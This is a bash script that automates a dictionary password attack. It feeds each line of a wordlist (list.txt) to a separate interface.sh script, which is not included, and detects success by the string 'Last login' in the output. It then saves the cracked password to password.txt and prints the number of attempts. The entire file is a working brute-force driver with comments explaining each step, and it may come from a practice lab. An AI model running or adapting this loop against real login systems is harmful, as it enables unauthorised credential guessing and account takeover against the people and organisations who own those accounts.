#!/bin/bash
if [ ! -f "password.txt" ]; then      #is final password already generated
 touch "password.txt"                 #create one(empty) if does not exist
fi                        
if [ ! -f "list.txt" ]; then     #does password file exist
 exit                            #create one if does not exist
#sed -i '1iyes' list.txt
fi
let "c=0"
while read -r LINE || [[ -n $LINE ]]; do      #while loop to real lines from password list file
	echo "$c"                     #COMMENT this line for better speed, only limitation is you wont get to know how many passwords has been tried in real time.
	if [ -s "password.txt" ]; then       #if final pass file is non-empty, meaning it hass some password so need to re-evaluate(initially it was empty)
        echo "Password Match after $c tries"        
	cat password.txt
	exit                  #password has already been found out, exit                         
else
  $(pwd)/interface.sh $LINE $c >temp.txt     #invoke the interface.sh script and store result of the evaluation in "temp.txt"
  ((c = c+1))                               #to keep track of the number of iterations
   if grep -q "Last login" "temp.txt"; then     #If output shows that there was a match
   sed $c"q;d" list.txt>password.txt         #To extract the password match, alternatively you can store the prev password in a variable and display it in case of a match
   echo "Password Match after $c tries"
   cat "password.txt"
   exit
   fi
fi
done<list.txt            #input file is fed to the loop for extracting each line
